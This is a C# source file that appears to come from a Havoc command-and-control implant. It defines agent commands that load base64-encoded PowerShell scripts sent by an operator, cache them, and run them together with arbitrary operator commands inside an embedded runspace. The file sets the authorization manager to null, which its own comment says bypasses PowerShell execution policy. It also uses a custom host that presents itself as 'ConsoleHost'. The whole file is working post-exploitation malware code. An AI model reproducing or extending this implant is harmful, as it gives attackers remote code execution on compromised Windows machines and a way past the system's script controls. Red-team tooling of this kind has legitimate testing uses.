using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Collections.ObjectModel;
using System.Web.Configuration;
using System.Web.Script.Serialization;
using System.Management.Automation.Host;
using System.Globalization;
using System.Threading;
using static System.Windows.Forms.AxHost;

namespace HavocImplant.AgentFunctions
{
    public class Powershell_Import : CommandInterface
    {
        public override string Command => "powershell_import";
        public override bool Dangerous => false;

        public override async Task Run(int taskId)
        {
            byte[] bPSScript = Convert.FromBase64String(Agent.taskingInformation[taskId].taskFile);
            string name = Agent.taskingInformation[taskId].taskArguments;
            try
            {
                Agent.PSScripts.Add(name, Encoding.ASCII.GetString(bPSScript));
                Output = $"Added {name} to cache, of size {bPSScript.Length}";
            }
            catch(ArgumentException)
            {
                Output = $"{name} already exists in the cache!";
            }
            ReturnOutput(taskId);
        }
    }
    public class Powershell_Free : CommandInterface
    {
        public override string Command => "powershell_free";
        public override bool Dangerous => false;

        public override async Task Run(int taskId)
        {
            string name = Agent.taskingInformation[taskId].taskArguments;
            try
            {
                Agent.PSScripts.Remove(name);
                Output = $"Removed {name} from cache";
            }
            catch(KeyNotFoundException)
            {
                Output = $"{name} is not in the cache";
            }
            ReturnOutput(taskId);
        }
    }
    public class Powershell_List : CommandInterface
    {
        public override string Command => "powershell_list";
        public override bool Dangerous => false;

        public override async Task Run(int taskId)
        {
            Output = "";
            if (Agent.PSScripts.Count == 0)
            {
                Output = "There are no scripts loaded";
            }
            else
            {
                foreach (KeyValuePair<string, string> kv in Agent.PSScripts)
                {
                    Output += String.Format("Script: {0,-15}    {1,-20} bytes\n", kv.Key, Encoding.ASCII.GetBytes(kv.Value).Length);
                }
            }
            ReturnOutput(taskId);
        }
    }
    public class Powershell : CommandInterface
    {
        public override string Command => "powershell";
        public override bool Dangerous => false;

        public override async Task Run(int taskId)
        {
            // Powershellcommands always one word so we can jank this up a bit, rather than adding another param to task struct
            //string command = Agent.taskingInformation[taskId].taskArguments.Split(new []{' '}, 2)[0];
            Output = "";
            string command = Agent.taskingInformation[taskId].taskArguments;

            CustomHost Host = new CustomHost();
            var State = InitialSessionState.CreateDefault();
            State.ApartmentState = ApartmentState.STA;
            State.AuthorizationManager = null;                  // Bypasses PowerShell execution policy
            State.ThreadOptions = PSThreadOptions.UseCurrentThread;

            using (Runspace rs = RunspaceFactory.CreateRunspace(Host, State))
            {
                rs.ApartmentState = Thread.CurrentThread.ApartmentState;
                rs.Open();
                using (PowerShell ps = PowerShell.Create())
                {
                    ps.Runspace = rs;

                    if (Agent.PSScripts.Count > 0)
                    {
                        foreach (KeyValuePair<string, string> kv in Agent.PSScripts)
                        {
                            Output += ExecuteCommand(kv.Value, ps);
                        }
                    }
                    Output += ExecuteCommand(command, ps);
                }
            }
            if (Output == "")
            {
                Output = "Execution had no output";
            }
            ReturnOutput(taskId);
        }
        
        public static string ExecuteCommand(string command, PowerShell ps)
        {
            string Output = "";
            using (Pipeline pipeline = ps.Runspace.CreatePipeline())
            {
                pipeline.Commands.AddScript(command);
                pipeline.Commands.Add("Out-string");
                pipeline.Commands[0].MergeMyResults(PipelineResultTypes.Error, PipelineResultTypes.Output);

                Collection<PSObject> pipelineOutput = pipeline.Invoke();
                foreach (PSObject p in pipelineOutput)
                {
                    if (p != null)
                    {
                        Output += $"{p.ToString()}\n";
                    }
                }
            }
            return Output;
        }
    }

    public class CustomHost : PSHost
    {
        private Guid _hostId = Guid.NewGuid();
        private PSHostUserInterface _ui = null;
        public override Guid InstanceId
        {
            get { return _hostId; }
        }

        public override string Name
        {
            get { return "ConsoleHost"; }
        }

        public override Version Version
        {
            get { return new Version(1, 0); }
        }

        public override PSHostUserInterface UI
        {
            get { return _ui; }
        }


        public override CultureInfo CurrentCulture
        {
            get { return Thread.CurrentThread.CurrentCulture; }
        }

        public override CultureInfo CurrentUICulture
        {
            get { return Thread.CurrentThread.CurrentUICulture; }
        }

        public override void EnterNestedPrompt()
        {
            throw new NotImplementedException("EnterNestedPrompt is not implemented.  The script is asking for input, which is a problem since there's no console.  Make sure the script can execute without prompting the user for input.");
        }

        public override void ExitNestedPrompt()
        {
            throw new NotImplementedException("ExitNestedPrompt is not implemented.  The script is asking for input, which is a problem since there's no console.  Make sure the script can execute without prompting the user for input.");
        }

        public override void NotifyBeginApplication()
        {
            return;
        }

        public override void NotifyEndApplication()
        {
            return;
        }

        public override void SetShouldExit(int exitCode)
        {
            return;
        }
    }
}
